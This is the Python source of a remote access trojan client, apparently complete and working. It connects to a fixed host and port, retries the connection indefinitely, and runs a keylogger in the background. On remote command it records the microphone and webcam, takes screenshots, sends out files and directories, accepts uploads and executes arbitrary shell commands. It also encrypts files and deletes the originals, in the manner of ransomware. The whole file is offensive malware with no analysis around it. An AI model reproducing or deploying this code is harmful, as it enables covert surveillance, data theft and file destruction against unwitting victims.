import os
import sys
import datetime
import socket
import shutil
import subprocess as sp
import time
import signal
import pynput
import pyautogui
from pynput.keyboard import Key, Listener  
import logging
import numpy as np
import cv2
import pyaudio
import wave
import pyAesCrypt
from tenacity import retry
import platform
from os import stat
import threading
import getpass
def close():
    global s
    s.close()
    sys.exit()
def encryptor():
    global s
    global buffer
    buffer = 64 * 1024
    Dfile=s.recv(4000)
    file=Dfile.decode()
   
    key=s.recv(4000)
    password=key.decode()
    
    if os.path.isfile(file):
        try:
            with open(file, "rb") as vfile:
                with open(file+".aes","wb") as Efile:
                    pyAesCrypt.encryptStream(vfile, Efile, password, buffer)
            sucs="File encrypted successfully"
            s.send(sucs.encode())
            os.remove(file)
        except:
            err="could not encrypt file"
            s.send(err.encode())
    elif os.path.isdir(file):
         
            zipfile=shutil.make_archive(file,'zip',file)
            dzip=file+".zip"
            try:
                with open(dzip,"rb") as vfile:
                    with open(dzip+".aes","wb") as Efile:
                        pyAesCrypt.encryptStream(vfile, Efile, password, buffer)
                shutil.rmtree(file)
                os.remove(dzip)
                suc="File encrypted successfully"
                s.send(suc.encode())
            except:
                err="could not encrypt file"
                s.send(err.encode())
def decryptor():
    global s
    global buffer
    Dfile=s.recv(4000)
    file=Dfile.decode()
    fsize = stat(file).st_size

    passw=s.recv(4000)
    Key=passw.decode()

    try:
        t=file.rsplit('.', 1)[0]
        if t.endswith("zip"):
            with open(file, "rb") as vfile:
                try:
                    with open(t, "wb") as Efile:
                            pyAesCrypt.decryptStream(vfile, Efile, Key, buffer, fsize)
                    vfile.close()
                    os.remove(file)
                    f=t.rsplit(".",1)[0]
                    shutil.unpack_archive(t,f,"zip")
                    suc="File decrypted successfully"
                    s.send(suc.encode())
                    Efile.close()
                    os.remove(t)
                except ValueError:
                    os.remove(file)
                    err="An Error occured while decrypting file"
                    s.send(err.encode())
        else:
            with open(file, "rb") as vfile:
                try:
                    with open(t, "wb") as Efile:
                            pyAesCrypt.decryptStream(vfile, Efile, Key, buffer, fsize)
                    vfile.close()
                    os.remove(file)
                    suc="File decrypted successfully"
                    s.send(suc.encode())
                except :
                    os.remove(file)
                    err="An Error occured while decrypting file"
                    s.send(err.encode())

            
    except:
        Err="Decryption was unsuccessful"
        s.send(Err.encode())
def keylog(): 
    def key_press(key):
            try:
                current_key = '{0} pressed'.format(key)
            
                
                with open("__.txt","a+") as f:
                    
                    f.write(str(key)+".pressed'..'")
            except AttributeError:
                    f.write('>uk<')
    def key_release(key):
            try:
                current_key = '{0} pressed'.format(key)       
                with open("__.txt","a+") as f:
                    f.write(str(key)+".released'..'")
            except AttributeError:
                f.write("<uk>")
    keyboard_listener = pynput.keyboard.Listener(on_press=key_press , on_release=key_release)
    with keyboard_listener: 
        keyboard_listener.join()

    
def cd():
    global s
    file_raw=s.recv(3000)
    file_path=file_raw.decode()
    try:
       if file_path.endswith(":"):
               os.chdir(file_path)
               volchanged="Changed volumes successfully"
               s.send(volchanged.encode())

              
       elif file_path.endswith(""):
               os.chdir(file_path)
               dirchanged="Changed directory successfully"
               s.send(file_path.encode())

               
       else:
               os.chdir(file_path)
               dirchanged="Changed directory successfully"
               s.send(file_path.encode())

               
    
    except:
       failed="could not cd into directory/volume"
       s.send(failed.encode())


       
def grab():
    global s
    try:      
         file_rcv=s.recv(2000)

         file=file_rcv.decode()

         if os.path.isdir(file):
                 Dir='Directory'
                 
                 s.send(Dir.encode())
                 zipfile=shutil.make_archive(file,'zip',file)
                 file_size=os.path.getsize(file+'.zip')
                 size=str(file_size)
                 s.send(size.encode())
                 response=s.recv(1024)
                 if response.decode()[:1]=="y":
                    
                     file_get=open(file+'.zip','rb')
                     file_data=file_get.read(file_size)
                     s.send(file_data)
                     file_get.close()
                    
                     os.remove(file+".zip")
                 else:
                     s.recv(1024)
                    
                   
         elif os.path.isfile(file):
                 Type='file'
                 s.send(Type.encode())
                 file_size=os.path.getsize(file)
                 size=str(file_size)
                 s.send(size.encode())
                
                 response=s.recv(1024)
                 if response.decode()[:1]=="y":
                     file_get=open(file,'rb')
                     file_data=file_get.read(file_size)
                     s.send(file_data)
                     file_get.close()
              
                 else:
                     s.recv(1024) 

               
         
         else : 
                 error="File not found here"

                 s.send(error.encode())
                 
    except:
         error="File not found"

         s.send(error.encode())
       
def audcap():
    global s
    timerec=s.recv(1024)
    capture_time=int(timerec.decode())
    try:
            chunk = 1024
            sample_format = pyaudio.paInt16  
            channels = 2
            fs = 44100  
            seconds = capture_time
            filename = "_.wav"

            p = pyaudio.PyAudio()  

       

            stream = p.open(format=sample_format,input_device_index=0,
                            channels=channels,
                            rate=fs,
                            frames_per_buffer=chunk,
                            input=True)

            frames = []  


            for i in range(0, int(fs / chunk * seconds)):
                data = stream.read(chunk,exception_on_overflow=False)
                frames.append(data)


            stream.stop_stream()
            stream.close()

            p.terminate()




            wf = wave.open(filename, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(sample_format))
            wf.setframerate(fs)
            wf.writeframes(b''.join(frames))
            wf.close()
            file_size=os.path.getsize('_.wav')
            size=str(file_size)
            s.send(size.encode())
            response=s.recv(1024)
            if response.decode()[:1]=="y":            
           
                file_get=open('_.wav','rb')
                file_data=file_get.read(file_size)
                s.send(file_data)
                file_get.close()
     
                os.remove('_.wav')
            else:
                os.remove("_.wav")
            

    except:
            audfail="could not capture audio"
            s.send(audfail.encode())
def vidcap():
    global s
    timerec=s.recv(1024)
    capture_time=int(timerec.decode())  
    try:
                                      
            cap = cv2.VideoCapture(0)
            x= cap.get(cv2.CAP_PROP_FRAME_WIDTH);
            y = cap.get(cv2.CAP_PROP_FRAME_HEIGHT);


            fourcc = cv2.VideoWriter_fourcc(*'DIVX')
            out = cv2.VideoWriter('_.mp4',fourcc,20.0,(int(x),int(y)))
            begin_time=time.time()
            while(int(time.time() - begin_time) < capture_time ):
                ret, frame = cap.read()
                if ret==True:



                    out.write(frame)
            

                else:
                    break


            cap.release()
            out.release()
            cv2.destroyAllWindows()
            file_size=os.path.getsize('_.mp4')
            size=str(file_size)
            s.send(size.encode())

            response=s.recv(1024)
            if response.decode()[:1]=="y":
                file_get=open('_.mp4','rb')
                file_data=file_get.read(file_size)
                s.send(file_data)
                file_get.close()
 
                os.remove('_.mp4')
            else:
                os.remove('_.mp4')
           
    except:
            capfail="could not capture video"
        
            s.send(capfail.encode())
            
def sysinfo():
    global s
    try:
        p=platform.machine(),platform.uname(),platform.system(),platform.processor(),getpass.getuser()
        s.send(str(p).encode())

    except:
        sf='could not acquire system information'
        s.send(sf.encode()) 
def screenshot():
    global s
    try:
         scrimage=pyautogui.screenshot()
         scrisave=pyautogui.screenshot('scrimage.jpg')
         
         file_size=os.path.getsize('scrimage.jpg')
         size=str(file_size)
         s.send(size.encode())
     
         file_get=open('scrimage.jpg','rb')
         file_data=file_get.read(file_size)
         s.send(file_data)
         file_get.close()

         os.remove('scrimage.jpg')
        
        
    except:
         error="Image not found"
        
         s.send(error.encode())
         
def upload():
    global s
    filenoun=s.recv(2000)
    filename=filenoun.decode()
    try:
            if filename.startswith('failed'):
                    print(" ")
            else:    
                    check=s.recv(4000)
                    checked=check.decode()
                    size=int(checked)
                    
                    file=open(filename,'wb')
                    file_data=s.recv(1024)
                    full_data=len(file_data)
                    file.write(file_data)
                    if full_data==size:
                        file.close()
                    while full_data<size:
                           file_data=s.recv(1024)
                           full_data += len(file_data)
                           file.write(file_data)
                    received="file received"
                    
                    s.send(received.encode())
    except:
            failed="could not receive file"
            s.send(failed.encode('utf-8'))
           
@retry
def main():
    global s
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host="10.42.0.1"
    port=740
    s.connect((host,port))
    while 1:
        while True:
            insydys_control=s.recv(4000)
            insydys_control=insydys_control.decode("utf-8")
         
            if insydys_control[:5]=="close":
                close()
                break
            elif insydys_control=="#":
                s.send(str.encode('#'))
                break
            elif insydys_control[:2]=="cd":
                cd()
                break
            elif insydys_control[:4]=="grab":
                grab()
                break
            elif insydys_control[:6]=="audcap":
                audcap()
                break
            elif insydys_control[:6]=="vidcap":
                vidcap()
                break
            elif insydys_control[:7]=="sysinfo":
                sysinfo()
                break
            elif insydys_control[:10]=="screenshot":
                screenshot()
                break
            elif insydys_control[:6]=="upload":
                upload()
                break
            elif insydys_control[:7]=="decrypt":
                decryptor()
                break
            elif insydys_control[:7]=="encrypt":
                encryptor()
                break
            elif insydys_control[:6]=="keylog":
                try:
                     file_size=os.path.getsize('__.txt')
                     size=str(file_size)
                     s.send(size.encode())
                   
                     file_get=open('__.txt','rb')
                     file_data=file_get.read(file_size)
                     s.send(file_data)
                     file_get.close()
                   
                     os.remove('__.txt')
                     global m
                     m.start()
                except:
                     c="could not capture key strokes"
                     s.send(c.encode())
                        
                
            
            else:
                sh=sp.Popen(insydys_control,shell=True,
                                        stdout=sp.PIPE,
                                        stderr=sp.PIPE,
                                        stdin=sp.PIPE)

                try:
                        direc=os.getcwd()
                        directo=direc.encode()
                        printout=sh.stdout.read() + sh.stderr.read()+directo
                        printo=printout.decode("utf-8")
                        get_out=open('_.txt','wb')
                        get_out.write(printout)
                        get_out.close()
                        sh.kill()
                        filed=os.path.getsize('_.txt')
                        file_d=str(filed)
                     
                        s.send(file_d.encode())

                        file=open('_.txt','rb')
                        output_data=file.read(filed)
                        s.send(output_data)
                        file.close()
 
                        os.remove('_.txt')
                        break
                except:
                        error="unknown output"
                        s.send(error.encode())
                        sh.kill()
                        break

global m
m=threading.Thread(name='keylog',target=keylog)
m.setDaemon(True)
if __name__=="__main__":
    m.start()
    main()
    


    

    

    
    

                
            
            
                
            
            
            
            
            
    

    
